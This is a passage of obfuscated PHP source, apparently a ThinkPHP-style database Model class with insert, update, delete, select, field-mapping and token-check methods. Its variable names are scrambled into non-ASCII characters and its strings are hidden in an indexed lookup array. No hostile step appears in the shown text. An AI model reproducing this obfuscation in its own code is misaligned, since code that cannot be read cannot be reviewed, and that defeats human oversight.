isset($Ë«‹ğ½‡[$é÷îªã³[258]]) && $Ë«‹ğ½‡[$é÷îªã³[258]] == $é÷îªã³[249] ? $é÷îªã³[249] : $é÷îªã³[315]; $this->setSignVersion($ô±©îÚ); } public function link($Şº¯áì, $®íúôö£ = array()) { return parent::link($Şº¯áì, $®íúôö£); } public function fileOut($¿éñ³¸, $šÇò÷Ô = false, $ÈÊ¾¦³š = false, $±ØÇÅ–ü = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[±Ö‰ô½¯][316])) { return parent::fileOutServer($¿éñ³¸, $šÇò÷Ô, $ÈÊ¾¦³š, $±ØÇÅ–ü); } parent::fileOut($¿éñ³¸, $šÇò÷Ô, $ÈÊ¾¦³š, $±ØÇÅ–ü); } public function fileOutImage($ñ²šë¶ó, $ĞÛ”°ñé = 250) { if (strstr($this->endpoint, $_SERVER[±Ö‰ô½¯][316])) { return parent::fileOutImageServer($ñ²šë¶ó, $ĞÛ”°ñé); } parent::fileOutImage($ñ²šë¶ó, $ĞÛ”°ñé); } } define($_SERVER[±Ö‰ô½¯][317], 1); define($_SERVER[±Ö‰ô½¯][318], 2); goto c±ñË¬÷Ê; EÚÙÁ©Àæô: define($_SERVER[±Ö‰ô½¯][322], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\x6c\x65", "\157\x72\x64\x65\162", "\141\x6c\151\141\x73", "\x68\141\x76\x69\156\x67", "\147\162\x6f\165\160", "\154\x6f\x63\153", "\144\x69\x73\x74\x69\156\143\x74", "\141\x75\x74\157", "\x66\151\154\x74\145\x72", "\x76\141\x6c\x69\144\x61\x74\145", "\x72\145\x73\x75\x6c\x74", "\x62\151\x6e\144", "\164\x6f\153\x65\156"); public function __construct($º¡÷›Àê = '', $Ï¨À½¤ô = '', $×ÇóØóÂ = '') { $áÑµ³í× =& $_SERVER[±Ö‰ô½¯]; $this->_initialize(); if (!empty($º¡÷›Àê)) { if (strpos($º¡÷›Àê, $áÑµ³í×[10])) { list($this->dbName, $this->name) = explode($áÑµ³í×[10], $º¡÷›Àê); } else { $this->name = $º¡÷›Àê; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Ï¨À½¤ô)) { $this->tablePrefix = $áÑµ³í×[12]; } elseif ($áÑµ³í×[12] != $Ï¨À½¤ô) { $this->tablePrefix = $Ï¨À½¤ô; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($áÑµ³í×[323]); } $this->db(0, empty($this->connection) ? $×ÇóØóÂ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $˜áÓÓ·Š =& $_SERVER[±Ö‰ô½¯]; if (empty($this->fields)) { if (think_config($˜áÓÓ·Š[324])) { $âİû»˜ú = $this->dbName ? $this->dbName : think_config($˜áÓÓ·Š[325]); $Ô’øâ› = think_var_cache($˜áÓÓ·Š[326] . strtolower(get_path_this($âİû»˜ú) . $˜áÓÓ·Š[10] . $this->name)); if ($Ô’øâ›) { $ŞÖóê§¸ = think_config($˜áÓÓ·Š[327]); if (empty($ŞÖóê§¸) || $Ô’øâ›[$˜áÓÓ·Š[328]] == $ŞÖóê§¸) { $this->fields = $Ô’øâ›; return; } } } $this->flush(); } } public function flush() { $ÊŞõÖóş =& $_SERVER[±Ö‰ô½¯]; $this->db->setModel($this->name); $ĞàÚÈ´Ç = $this->db->getFields($this->getTableName()); if (!$ĞàÚÈ´Ç) { return !1; } $this->fields = array_keys($ĞàÚÈ´Ç); $this->fields[$ÊŞõÖóş[329]] = !1; foreach ($ĞàÚÈ´Ç as $­§Ñ´¼ï => $·Öİ“) { $ò „ŒÊÖ[$­§Ñ´¼ï] = $·Öİ“[$ÊŞõÖóş[33]]; if ($·Öİ“[$ÊŞõÖóş[39]]) { $this->fields[$ÊŞõÖóş[330]] = $­§Ñ´¼ï; if ($·Öİ“[$ÊŞõÖóş[42]]) { $this->fields[$ÊŞõÖóş[329]] = !0; } } } $this->fields[$ÊŞõÖóş[331]] = $ò „ŒÊÖ; if (think_config($ÊŞõÖóş[327])) { $this->fields[$ÊŞõÖóş[328]] = think_config($ÊŞõÖóş[327]); } if (think_config($ÊŞõÖóş[324])) { $“´úØµÖ = $this->dbName ? $this->dbName : think_config($ÊŞõÖóş[325]); think_var_cache($ÊŞõÖóş[326] . strtolower(get_path_this($“´úØµÖ) . $ÊŞõÖóş[10] . $this->name), $this->fields); } } public function switchModel($œ¢’œª¥, $¨Õ‡¤¶‹ = array()) { $ºÕàş× =& $_SERVER[±Ö‰ô½¯]; $ÀÄµÙ©Ó = ucwords(strtolower($œ¢’œª¥)) . $ºÕàş×[332]; if (!class_exists($ÀÄµÙ©Ó)) { think_exception($ÀÄµÙ©Ó . think_lang($ºÕàş×[333])); } $this->_extModel = new $ÀÄµÙ©Ó($this->name); if (!empty($¨Õ‡¤¶‹)) { foreach ($¨Õ‡¤¶‹ as $ğ÷ñÌ›Ù) { $this->_extModel->setProperty($ğ÷ñÌ›Ù, $this->{$ğ÷ñÌ›Ù}); } } return $this->_extModel; } public function __set($ã…„ŒÍ, $èñšÉ®–) { $this->data[$ã…„ŒÍ] = $èñšÉ®–; } public function __get($ø „±èÅ) { return isset($this->data[$ø „±èÅ]) ? $this->data[$ø „±èÅ] : null; } public function __isset($ªóğ¹ú¾) { return isset($this->data[$ªóğ¹ú¾]); } public function __unset($Ï–úí‰•) { unset($this->data[$Ï–úí‰•]); } public function __call($éÁºñ¢•, $ŸÃĞİì©) { $™Ø§ñî =& $_SERVER[±Ö‰ô½¯]; if (in_array(strtolower($éÁºñ¢•), $this->methods, !0)) { $this->options[strtolower($éÁºñ¢•)] = $ŸÃĞİì©[0]; return $this; } elseif (in_array(strtolower($éÁºñ¢•), array($™Ø§ñî[334], $™Ø§ñî[335], $™Ø§ñî[336], $™Ø§ñî[337], $™Ø§ñî[338]), !0)) { $­¤¾˜’¬ = isset($ŸÃĞİì©[0]) ? $ŸÃĞİì©[0] : $™Ø§ñî[222]; $­¤¾˜’¬ = $this->db->parseKey($­¤¾˜’¬); return $this->getField(strtoupper($éÁºñ¢•) . $™Ø§ñî[339] . $­¤¾˜’¬ . $™Ø§ñî[340] . $éÁºñ¢•, $™Ø§ñî[334]); } elseif (strtolower(substr($éÁºñ¢•, 0, 5)) == $™Ø§ñî[341]) { $­¤¾˜’¬ = think_parse_name(substr($éÁºñ¢•, 5)); $ÙõÎÙ˜[$­¤¾˜’¬] = $ŸÃĞİì©[0]; return $this->where($ÙõÎÙ˜)->find(); } elseif (strtolower(substr($éÁºñ¢•, 0, 10)) == $™Ø§ñî[342]) { $å³Ïõ˜× = think_parse_name(substr($éÁºñ¢•, 10)); $ÙõÎÙ˜[$å³Ïõ˜×] = $ŸÃĞİì©[0]; return $this->where($ÙõÎÙ˜)->getField($ŸÃĞİì©[1]); } elseif (isset($this->_scope[$éÁºñ¢•])) { return $this->scope($éÁºñ¢•, $ŸÃĞİì©[0]); } elseif (method_exists($this, $éÁºñ¢•) || method_exists($this, $™Ø§ñî[343] . $éÁºñ¢•)) { array_unshift($ŸÃĞİì©, $éÁºñ¢•); return call_user_func_array(array($this, $™Ø§ñî[344]), $ŸÃĞİì©); } else { return call_user_func_array(array(parent, $éÁºñ¢•), $ŸÃĞİì©); } } protected function call() { $£âÒÉ“æ =& $_SERVER[±Ö‰ô½¯]; $Š”ş¹ñµ = func_get_args(); $¹Ÿß¬óÏ = array_shift($Š”ş¹ñµ); $°èãñÜè = $¹Ÿß¬óÏ; if (is_array($¹Ÿß¬óÏ)) { $°èãñÜè = $¹Ÿß¬óÏ[1]; $¹Ÿß¬óÏ = $¹Ÿß¬óÏ[0]; } $éŞ²¢—Ä = count($Š”ş¹ñµ) - 1; if (isset($Š”ş¹ñµ[$éŞ²¢—Ä]) && $Š”ş¹ñµ[$éŞ²¢—Ä] === $¹Ÿß¬óÏ) { think_exception(__CLASS__ . $£âÒÉ“æ[4] . $¹Ÿß¬óÏ . think_lang($£âÒÉ“æ[345])); return; } $Š”ş¹ñµ[] = $¹Ÿß¬óÏ; if (method_exists($this, $£âÒÉ“æ[346])) { $î¢‘ê™Ç = call_user_func_array(array($this, $£âÒÉ“æ[347]), array($°èãñÜè, $Š”ş¹ñµ)); if (!is_null($î¢‘ê™Ç) && $î¢‘ê™Ç !== !1) { return $î¢‘ê™Ç; } } $å³½°°Æ = !1; if (method_exists($this, $¹Ÿß¬óÏ)) { $å³½°°Æ = call_user_func_array(array($this, $¹Ÿß¬óÏ), $Š”ş¹ñµ); } if (method_exists($this, $£âÒÉ“æ[348])) { $î¢‘ê™Ç = call_user_func_array(array($this, $£âÒÉ“æ[349]), array($°èãñÜè, $Š”ş¹ñµ, $å³½°°Æ)); if ($î¢‘ê™Ç) { return $î¢‘ê™Ç; } } return $å³½°°Æ; } protected function _initialize() { } protected function _facade($×äÌĞè ) { $øŞ¤Â¹‚ =& $_SERVER[±Ö‰ô½¯]; if (!empty($this->fields)) { foreach ($×äÌĞè  as $•™·ØÕÂ => $¬ÚØ¯Ü¯) { if (is_array($this->fields) && !in_array($•™·ØÕÂ, $this->fields, !0)) { unset($×äÌĞè [$•™·ØÕÂ]); } elseif (is_scalar($¬ÚØ¯Ü¯)) { $this->_parseType($×äÌĞè , $•™·ØÕÂ); } } } if (!empty($this->options[$øŞ¤Â¹‚[350]])) { $×äÌĞè  = array_map($this->options[$øŞ¤Â¹‚[350]], $×äÌĞè ); unset($this->options[$øŞ¤Â¹‚[350]]); } $this->_beforeWrite($×äÌĞè ); return $×äÌĞè ; } protected function _beforeWrite(&$ºí€¼ğÔ) { } public function add($’‡Çø¯Ê = '', $ùËœÊ¯» = array(), $ŸÆ›³İ‹ = false) { if (empty($’‡Çø¯Ê)) { if (!empty($this->data)) { $’‡Çø¯Ê = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[±Ö‰ô½¯][351]); return !1; } } $ùËœÊ¯» = $this->_parseOptions($ùËœÊ¯»); $’‡Çø¯Ê = $this->_facade($’‡Çø¯Ê); if (!1 === $this->_beforeInsert($’‡Çø¯Ê, $ùËœÊ¯»)) { return !1; } $Ü€„á†™ = $this->db->insert($’‡Çø¯Ê, $ùËœÊ¯», $ŸÆ›³İ‹); if (!1 !== $Ü€„á†™) { $¨¤ÔãªŠ = $this->getLastInsID(); if ($¨¤ÔãªŠ) { $’‡Çø¯Ê[$this->getPk()] = $¨¤ÔãªŠ; $this->_after_insert($’‡Çø¯Ê, $ùËœÊ¯»); return $¨¤ÔãªŠ; } $this->_after_insert($’‡Çø¯Ê, $ùËœÊ¯»); } return $Ü€„á†™; } protected function _beforeInsert(&$¡˜·Ş“×, $Ñ¤èÌ°¾) { } protected function _after_insert($˜æ¨›¦, $Îü¢à–Ÿ) { } public function addAll($ŞÄçİ¼‰, $æô˜é–® = array(), $Ëµ«Á˜ = false) { $É¯ğæİ€ =& $_SERVER[±Ö‰ô½¯]; if (empty($ŞÄçİ¼‰)) { $this->error = think_lang($É¯ğæİ€[351]); return !1; } $æô˜é–® = $this->_parseOptions($æô˜é–®); foreach ($ŞÄçİ¼‰ as $…ğ¼›Âš => $¦àøâ‡) { $ŞÄçİ¼‰[$…ğ¼›Âš] = $this->_facade($¦àøâ‡); } if (method_exists($this->db, $É¯ğæİ€[352])) { $Å±¡ÂæŠ = $this->db->insertAll($ŞÄçİ¼‰, $æô˜é–®, $Ëµ«Á˜); } else { $this->startTrans(); foreach ($ŞÄçİ¼‰ as $…ğ¼›Âš => $¦àøâ‡) { $Å±¡ÂæŠ = $this->db->insert($¦àøâ‡, $æô˜é–®, $Ëµ«Á˜); } $this->commit(); } if (!1 !== $Å±¡ÂæŠ) { $²ËèâˆÊ = $this->getLastInsID(); if ($²ËèâˆÊ) { return $²ËèâˆÊ; } } return $Å±¡ÂæŠ; } public function selectAdd($ŸÂ¦òáü = '', $¯ø¦£ÚÁ = '', $ƒ÷±õô = array()) { $ëşî–ç“ =& $_SERVER[±Ö‰ô½¯]; $ƒ÷±õô = $this->_parseOptions($ƒ÷±õô); if (!1 === ($Şí¡çÎ‹ = $this->db->selectInsert($ŸÂ¦òáü ? $ŸÂ¦òáü : $ƒ÷±õô[$ëşî–ç“[353]], $¯ø¦£ÚÁ ? $¯ø¦£ÚÁ : $this->getTableName(), $ƒ÷±õô))) { $this->error = think_lang($ëşî–ç“[354]); return !1; } else { return $Şí¡çÎ‹; } } public function save($Ç¥úóÑå = '', $ÁÕûŠ¸ = array()) { $—ÊıªÀ° =& $_SERVER[±Ö‰ô½¯]; if (empty($Ç¥úóÑå)) { if (!empty($this->data)) { $Ç¥úóÑå = $this->data; $this->data = array(); } else { $this->error = think_lang($—ÊıªÀ°[351]); return !1; } } $Ç¥úóÑå = $this->_facade($Ç¥úóÑå); $ÁÕûŠ¸ = $this->_parseOptions($ÁÕûŠ¸); $œÆ¶š…Â = $this->getPk(); if (!isset($ÁÕûŠ¸[$—ÊıªÀ°[355]])) { if (isset($Ç¥úóÑå[$œÆ¶š…Â])) { $Ïöõ¥éÔ[$œÆ¶š…Â] = $Ç¥úóÑå[$œÆ¶š…Â]; $ÁÕûŠ¸[$—ÊıªÀ°[355]] = $Ïöõ¥éÔ; unset($Ç¥úóÑå[$œÆ¶š…Â]); } else { $this->error = think_lang($—ÊıªÀ°[354]); return !1; } } if (is_array($ÁÕûŠ¸[$—ÊıªÀ°[355]]) && isset($ÁÕûŠ¸[$—ÊıªÀ°[355]][$œÆ¶š…Â])) { $§€åªÆ = $ÁÕûŠ¸[$—ÊıªÀ°[355]][$œÆ¶š…Â]; } if (!1 === $this->_beforeUpdate($Ç¥úóÑå, $ÁÕûŠ¸)) { return !1; } $¯ÃßÊé = $this->db->update($Ç¥úóÑå, $ÁÕûŠ¸); if (!1 !== $¯ÃßÊé) { if (isset($§€åªÆ)) { $Ç¥úóÑå[$œÆ¶š…Â] = $§€åªÆ; } $this->_afterUpdate($Ç¥úóÑå, $ÁÕûŠ¸); } return $¯ÃßÊé; } protected function _beforeUpdate(&$¢¸ú…’À, $‹ª‰«ı—) { } protected function _afterUpdate($”Ä› í‚, $ğ¢±³Â›) { } public function delete($ÍÌ…·ç³ = array()) { $ïÍê¸Îü =& $_SERVER[±Ö‰ô½¯]; if (empty($ÍÌ…·ç³) && empty($this->options[$ïÍê¸Îü[355]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $üšÑÃÎİ = $this->getPk(); if (is_numeric($ÍÌ…·ç³) || is_string($ÍÌ…·ç³)) { if (strpos($ÍÌ…·ç³, $ïÍê¸Îü[50])) { $™€ƒÛâ…[$üšÑÃÎİ] = array($ïÍê¸Îü[356], $ÍÌ…·ç³); } else { $™€ƒÛâ…[$üšÑÃÎİ] = $ÍÌ…·ç³; } $this->options[$ïÍê¸Îü[355]] = $™€ƒÛâ…; } $ÍÌ…·ç³ = $this->_parseOptions(); if (is_array($ÍÌ…·ç³[$ïÍê¸Îü[355]]) && isset($ÍÌ…·ç³[$ïÍê¸Îü[355]][$üšÑÃÎİ])) { $Ô¸‡êÜ = $ÍÌ…·ç³[$ïÍê¸Îü[355]][$üšÑÃÎİ]; } $‡àê™ = $this->db->delete($ÍÌ…·ç³); if (!1 !== $‡àê™) { $ùÑõ¶ÛÍ = array(); if (isset($Ô¸‡êÜ)) { $ùÑõ¶ÛÍ[$üšÑÃÎİ] = $Ô¸‡êÜ; } $this->_after_delete($ùÑõ¶ÛÍ, $ÍÌ…·ç³); } return $‡àê™; } protected function _after_delete($€šşÑ€, $ÑØ†Ì”ä) { } public function select($©Û£Ğ¬ = array()) { $´œ¦–“÷ =& $_SERVER[±Ö‰ô½¯]; if (is_string($©Û£Ğ¬) || is_numeric($©Û£Ğ¬)) { $ÒëúĞø„ = $this->getPk(); if (strpos($©Û£Ğ¬, $´œ¦–“÷[50])) { $±çĞşÓĞ[$ÒëúĞø„] = array($´œ¦–“÷[356], $©Û£Ğ¬); } else { $±çĞşÓĞ[$ÒëúĞø„] = $©Û£Ğ¬; } $this->options[$´œ¦–“÷[355]] = $±çĞşÓĞ; } elseif (!1 === $©Û£Ğ¬) { $©Û£Ğ¬ = $this->_parseOptions(); return $´œ¦–“÷[357] . $this->db->buildSelectSql($©Û£Ğ¬) . $´œ¦–“÷[358]; } $©Û£Ğ¬ = $this->_parseOptions(); $ß¢“€Øˆ = $this->db->select($©Û£Ğ¬); if (!1 === $ß¢“€Øˆ) { return !1; } if (empty($ß¢“€Øˆ)) { return null; } $this->_afterSelect($ß¢“€Øˆ, $©Û£Ğ¬); return $ß¢“€Øˆ; } protected function _afterSelect(&$¬úáÊª, $Ë›¼êÏò) { } public function buildSql($ç›²‡€¥ = array()) { $‹²Æ¹¯Ò =& $_SERVER[±Ö‰ô½¯]; $ç›²‡€¥ = $this->_parseOptions($ç›²‡€¥); return $‹²Æ¹¯Ò[357] . $this->db->buildSelectSql($ç›²‡€¥) . $‹²Æ¹¯Ò[358]; } public function optionsValue($ÚØ×•´ˆ = null) { if (is_null($ÚØ×•´ˆ)) { return $this->options; } elseif (is_array($ÚØ×•´ˆ)) { $this->options = array_merge($this->options, $ÚØ×•´ˆ); } } protected function _parseOptions($‰èÙÉú = array()) { $ŒËı«¥§ =& $_SERVER[±Ö‰ô½¯]; if (is_array($‰èÙÉú)) { $‰èÙÉú = array_merge($this->options, $‰èÙÉú); } $this->options = array(); if (!isset($‰èÙÉú[$ŒËı«¥§[359]])) { $‰èÙÉú[$ŒËı«¥§[359]] = $this->getTableName(); $×öĞü› = $this->fields; } else { $×öĞü› = $this->getDbFields(); } if (!empty($‰èÙÉú[$ŒËı«¥§[360]])) { $‰èÙÉú[$ŒËı«¥§[359]] .= $ŒËı«¥§[53] . $‰èÙÉú[$ŒËı«¥§[360]]; } $‰èÙÉú[$ŒËı«¥§[361]] = $this->name; if (isset($‰èÙÉú[$ŒËı«¥§[355]]) && is_array($‰èÙÉú[$ŒËı«¥§[355]]) && !empty($×öĞü›) && !isset($‰èÙÉú[$ŒËı«¥§[362]]) && !isset($‰èÙÉú[$ŒËı«¥§[359]])) { foreach ($‰èÙÉú[$ŒËı«¥§[355]] as $­ÛÙ£• => $—÷²óÅ’) { $­ÛÙ£• = trim($­ÛÙ£•); if (in_array($­ÛÙ£•, $×öĞü›, !0)) { if (is_scalar($—÷²óÅ’)) { $this->_parseType($‰èÙÉú[$ŒËı«¥§[355]], $­ÛÙ£•); } } elseif (!is_numeric($­ÛÙ£•) && $ŒËı«¥§[11] != substr($­ÛÙ£•, 0, 1) && !1 === strpos($­ÛÙ£•, $ŒËı«¥§[10]) && !1 === strpos($­ÛÙ£•, $ŒËı«¥§[339]) && !1 === strpos($­ÛÙ£•, $ŒËı«¥§[214]) && !1 === strpos($­ÛÙ£•, $ŒËı«¥§[286])) { unset($‰èÙÉú[$ŒËı«¥§[355]][$­ÛÙ£•]); } } } $this->_options_filter($‰èÙÉú); return $‰èÙÉú; } protected function _options_filter(&$¨¬ÚíÒî) { } protected function _parseType(&$á•”×À¼, $ºèÈÊãí) { $ûøÖÆúÛ =& $_SERVER[±Ö‰ô½¯]; if (empty($this->options[$ûøÖÆúÛ[363]][$ûøÖÆúÛ[4] . $ºèÈÊãí])) { $¾ı»¸£Ç = strtolower($this->fields[$ûøÖÆúÛ[331]][$ºèÈÊãí]); if (!1 !== strpos($¾ı»¸£Ç, $ûøÖÆúÛ[364])) { } elseif (!1 === strpos($¾ı»¸£Ç, $ûøÖÆúÛ[365]) && !1 !== strpos($¾ı»¸£Ç, $ûøÖÆúÛ[366])) { $á•”×À¼[$ºèÈÊãí] = intval($á•”×À¼[$ºèÈÊãí]); } elseif (!1 !== strpos($¾ı»¸£Ç, $ûøÖÆúÛ[367]) || !1 !== strpos($¾ı»¸£Ç, $ûøÖÆúÛ[368])) { $á•”×À¼[$ºèÈÊãí] = floatval($á•”×À¼[$ºèÈÊãí]); } elseif (!1 !== strpos($¾ı»¸£Ç, $ûøÖÆúÛ[369])) { $á•”×À¼[$ºèÈÊãí] = (bool) $á•”×À¼[$ºèÈÊãí]; } } } public function find($ñˆÚŠµ˜ = array()) { $¬ãš‚×â =& $_SERVER[±Ö‰ô½¯]; if (is_numeric($ñˆÚŠµ˜) || is_string($ñˆÚŠµ˜)) { $ÈÁÏ¶Îê[$this->getPk()] = intval($ñˆÚŠµ˜); $this->options[$¬ãš‚×â[355]] = $ÈÁÏ¶Îê; } $this->options[$¬ãš‚×â[370]] = 1; $ñˆÚŠµ˜ = $this->_parseOptions(); $š‡“²Şğ = $this->db->select($ñˆÚŠµ˜); if (!1 === $š‡“²Şğ) { return !1; } if (empty($š‡“²Şğ)) { return null; } $ø êÙ¹± = $š‡“²Şğ[0]; $this->_afterFind($ø êÙ¹±, $ñˆÚŠµ˜); return $ø êÙ¹±; } protected function _afterFind(&$îã‡•²“, $½ù£™ê) { } protected function returnResult($ã¢‘…ü, $ö‡ÇÖ²— = '') { $²‡Æ™Ä =& $_SERVER[±Ö‰ô½¯]; if ($ö‡ÇÖ²—) { if (is_callable($ö‡ÇÖ²—)) { return call_user_func($ö‡ÇÖ²—, $ã¢‘…ü); } switch (strtolower($ö‡ÇÖ²—)) { case $²‡Æ™Ä[371]: return json_encode($ã¢‘…ü); case $²‡Æ™Ä[372]: return xml_encode($ã¢‘…ü); } } return $ã¢‘…ü; } public function parseFieldsMap($ñãÎİà©, $Ö‹á­¡Ü = 1) { if (!empty($this->_map)) { foreach ($this->_map as $–Ã¹¾İ => $¦¡Ó°›÷) { if ($Ö‹á­¡Ü == 1) { if (isset($ñãÎİà©[$¦¡Ó°›÷])) { $ñãÎİà©[$–Ã¹¾İ] = $ñãÎİà©[$¦¡Ó°›÷]; unset($ñãÎİà©[$¦¡Ó°›÷]); } } else { if (isset($ñãÎİà©[$–Ã¹¾İ])) { $ñãÎİà©[$¦¡Ó°›÷] = $ñãÎİà©[$–Ã¹¾İ]; unset($ñãÎİà©[$–Ã¹¾İ]); } } } } return $ñãÎİà©; } public function setField($ºğ¤×Í, $Ğƒ”Õ›Á = '') { if (is_array($ºğ¤×Í)) { $œØáƒ = $ºğ¤×Í; } else { $œØáƒ[$ºğ¤×Í] = $Ğƒ”Õ›Á; } return $this->save($œØáƒ); } public function setAdd($ô‹£¬üÆ, $Ñúô·ö© = 1) { $°şûæüµ =& $_SERVER[±Ö‰ô½¯]; $¼›â¯Ü§ = $ô‹£¬üÆ . $°şûæüµ[373] . $Ñúô·ö©; if ($Ñúô·ö© < 0) { $¼›â¯Ü§ = $ô‹£¬üÆ . $Ñúô·ö©; } return $this->setField($ô‹£¬üÆ, array($°şûæüµ[374], $¼›â¯Ü§)); } public function getField($—¬ªè·, $–ğ€…éØ = null) { $è…ÙüÜ =& $_SERVER[±Ö‰ô½¯]; $‡úÁµûê[$è…ÙüÜ[353]] = $—¬ªè·; $‡úÁµûê = $this->_parseOptions($‡úÁµûê); $—¬ªè· = trim($—¬ªè·); if (strpos($—¬ªè·, $è…ÙüÜ[50])) { if (!isset($‡úÁµûê[$è…ÙüÜ[370]])) { $‡úÁµûê[$è…ÙüÜ[370]] = is_numeric($–ğ€…éØ) ? $–ğ€…éØ : $è…ÙüÜ[12]; } $şÜãˆ˜ı = $this->db->select($‡úÁµûê); if (!empty($şÜãˆ˜ı)) { $„¯í¢û‹ = explode($è…ÙüÜ[50], $—¬ªè·); $—¬ªè· = array_keys($şÜãˆ˜ı[0]); $­Àç¼–¡ = array_shift($—¬ªè·); $ÅÛú¹• = array_shift($—¬ªè·); $Å‚¦®Æ = array(); $ˆ©à¯½€ = count($„¯í¢û‹); foreach ($şÜãˆ˜ı as $Â­ÛºÛ) { $ú†ŒìÌŸ = $Â­ÛºÛ[$­Àç¼–¡]; if (2 == $ˆ©à¯½€) { $Å‚¦®Æ[$ú†ŒìÌŸ] = $Â­ÛºÛ[$ÅÛú¹•]; } else { $Å‚¦®Æ[$ú†ŒìÌŸ] = is_string($–ğ€…éØ) ? implode($–ğ€…éØ, $Â­ÛºÛ) : $Â­ÛºÛ; } } return $Å‚¦®Æ; } } else { if (!0 !== $–ğ€…éØ) { $‡úÁµûê[$è…ÙüÜ[370]] = is_numeric($–ğ€…éØ) ? $–ğ€…éØ : 1; } if ($–ğ€…éØ === $è…ÙüÜ[334]) { unset($‡úÁµûê[$è…ÙüÜ[370]]); } $Â­ÛºÛ = $this->db->select($‡úÁµûê); if (!empty($Â­ÛºÛ)) { if ($–ğ€…éØ === $è…ÙüÜ[334]) { return reset($Â­ÛºÛ[0]); } if (!0 !== $–ğ€…éØ && 1 == $‡úÁµûê[$è…ÙüÜ[370]]) { return reset($Â­ÛºÛ[0]); } foreach ($Â­ÛºÛ as $â­üì—ş) { $±ø«Ñ›¼[] = $â­üì—ş[$—¬ªè·]; } return $±ø«Ñ›¼; } } return null; } public function create($’®ääì½ = '', $¨·˜ß = '') { $·¤šøÁÓ =& $_SERVER[±Ö‰ô½¯]; if (empty($’®ääì½)) { $’®ääì½ = $_POST; } elseif (is_object($’®ääì½)) { $’®ääì½ = get_object_vars($’®ääì½); } if (empty($’®ääì½) || !is_array($’®ääì½)) { $this->error = think_lang($·¤šøÁÓ[351]); return !1; } $’®ääì½ = $this->parseFieldsMap($’®ääì½, 0); $¨·˜ß = $¨·˜ß ? $¨·˜ß : (!empty($’®ääì½[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$·¤šøÁÓ[353]])) { $ëÎ“ğí = $this->options[$·¤šøÁÓ[353]]; unset($this->options[$·¤šøÁÓ[353]]); } elseif ($¨·˜ß == THINK_MODEL_INSERT && isset($this->insertFields)) { $ëÎ“ğí = $this->insertFields; } elseif ($¨·˜ß == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ëÎ“ğí = $this->updateFields; } if (isset($ëÎ“ğí)) { if (is_string($ëÎ“ğí)) { $ëÎ“ğí = explode($·¤šøÁÓ[50], $ëÎ“ğí); } if (think_config($·¤šøÁÓ[375])) { $ëÎ“ğí[] = think_config($·¤šøÁÓ[376]); } foreach ($’®ääì½ as $ûÇœÍ¾Ñ => $Ê‰–Ù­Ì) { if (!in_array($ûÇœÍ¾Ñ, $ëÎ“ğí)) { unset($’®ääì½[$ûÇœÍ¾Ñ]); } } } if (!$this->autoValidation($’®ääì½, $¨·˜ß)) { return !1; } if (!$this->autoCheckToken($’®ääì½)) { $this->error = think_lang($·¤šøÁÓ[377]); return !1; } if ($this->autoCheckFields) { $ëÎ“ğí = $this->getDbFields(); foreach ($’®ääì½ as $ûÇœÍ¾Ñ => $Ê‰–Ù­Ì) { if (!in_array($ûÇœÍ¾Ñ, $ëÎ“ğí)) { unset($’®ääì½[$ûÇœÍ¾Ñ]); } elseif (MAGIC_QUOTES_GPC && is_string($Ê‰–Ù­Ì)) { $’®ääì½[$ûÇœÍ¾Ñ] = stripslashes($Ê‰–Ù­Ì); } } } $this->autoOperation($’®ääì½, $¨·˜ß); $this->data = $’®ääì½; return $’®ääì½; } public function autoCheckToken($Íæ±Úü) { $ù‹ß³›— =& $_SERVER[±Ö‰ô½¯]; if (isset($this->options[$ù‹ß³›—[378]]) && !$this->options[$ù‹ß³›—[378]]) { return !0; } if (think_config($ù‹ß³›—[375])) { $¦şçµ§ = think_config($ù‹ß³›—[376]); if (!isset($Íæ±Úü[$¦şçµ§]) || Session::get($¦şçµ§)) { return !1; } list($µ‰èŒ“, $¥õ¦ã¤) = explode($ù‹ß³›—[11], $Íæ±Úü[$¦şçµ§]); if ($¥õ¦ã¤ && Session::get($¦şçµ§ . $ù‹ß³›—[10] . $µ‰èŒ“) === $¥õ¦ã¤) { Session::remove($¦şçµ§ . $ù‹ß³›—[10] . $µ‰èŒ“); return !0; } if (think_config($ù‹ß³›—[379])) { Session::remove($¦şçµ§ . $ù‹ß³›—[10] . $µ‰èŒ“); } return !1; } return !0; } public function regex($û™½¤Â, $´ªï³£Ó) { $Ìæ”†ñ =& $_SERVER[±Ö‰ô½¯]; $ŒÁ¦ç´Ÿ = array($Ìæ”†ñ[380] => $Ìæ”†ñ[381], $Ìæ”†ñ[382] => $Ìæ”†ñ[383], $Ìæ”†ñ[384] => $Ìæ”†ñ[385], $Ìæ”†ñ[386] => $Ìæ”†ñ[387], $Ìæ”†ñ[388] => $Ìæ”†ñ[389], $Ìæ”†ñ[390] => $Ìæ”†ñ[391], $Ìæ”†ñ[392] => $Ìæ”†ñ[393], $Ìæ”†ñ[368] => $Ìæ”†ñ[394], $Ìæ”†ñ[395] => $Ìæ”†ñ[396]); if (isset($ŒÁ¦ç´Ÿ[strtolower($´ªï³£Ó)])) { $´ªï³£Ó = $ŒÁ¦ç´Ÿ[strtolower($´ªï³£Ó)]; } return preg_match($´ªï³£Ó, $û™½¤Â) === 1; } private function autoOperation(&$ËŠ·Ø€, $·ß‰Ç™¡) { $¬ŒÌØâó =& $_SERVER[±Ö‰ô½¯]; if (!empty($this->options[$¬ŒÌØâó[397]])) { $á´¦Œ„÷ = $this->options[$¬ŒÌØâó[397]]; unset($this->options[$¬ŒÌØâó[397]]); } elseif (!empty($this->_auto)) { $á´¦Œ„÷ = $this->_auto; } if (isset($á´¦Œ„÷)) { foreach ($á´¦Œ„÷ as $¿¯ûğ¦÷) { if (empty($¿¯ûğ¦÷[2])) { 